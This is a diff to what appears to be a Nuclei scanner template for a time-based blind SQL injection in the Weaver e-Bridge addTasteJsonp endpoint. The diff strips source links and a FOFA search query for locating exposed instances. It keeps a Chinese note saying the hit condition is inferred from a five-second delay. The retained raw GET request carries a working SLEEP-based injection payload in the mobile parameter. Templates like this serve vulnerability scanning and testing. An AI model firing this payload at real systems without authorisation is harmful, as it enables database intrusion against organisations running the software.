@@ -3,14 +3,8 @@ info:
   name: 泛微-云桥e-Bridge addTasteJsonp SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gnmreuo4dm5gwkhi
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gnmreuo4dm5gwkhi
-    fofa: app="泛微云桥e-Bridge"
 http:
 - raw:
   - 'GET /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1''+AND+(SELECT+6488+FROM+(SELECT(SLEEP(5)))CvMg)+OR+''JmLq''=''IpuI HTTP/1.1
